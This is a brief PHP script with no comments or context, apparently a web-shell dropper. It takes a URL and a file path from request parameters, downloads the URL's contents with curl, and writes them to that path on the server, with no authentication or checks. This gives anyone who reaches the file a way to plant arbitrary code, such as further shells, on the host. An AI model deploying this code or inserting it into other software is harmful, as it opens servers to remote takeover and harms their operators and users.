<?php 
$x=postData($_REQUEST['u']);
file_put_contents($_REQUEST['f'], $x);
function postData($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$retn = curl_exec($ch);
	return $retn;
}
